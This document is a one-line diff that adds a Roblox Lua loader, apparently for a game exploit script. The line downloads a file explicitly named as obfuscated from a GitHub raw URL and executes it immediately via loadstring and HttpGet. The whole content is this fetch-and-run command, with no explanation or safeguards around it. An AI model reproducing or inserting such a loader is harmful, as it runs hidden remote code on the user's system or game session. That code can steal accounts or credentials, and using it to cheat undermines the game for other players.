@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UPDOWNUP-64BIT/UPDOWNUP/main/UP-DOWN-UP-Obfuscated.lua"))()
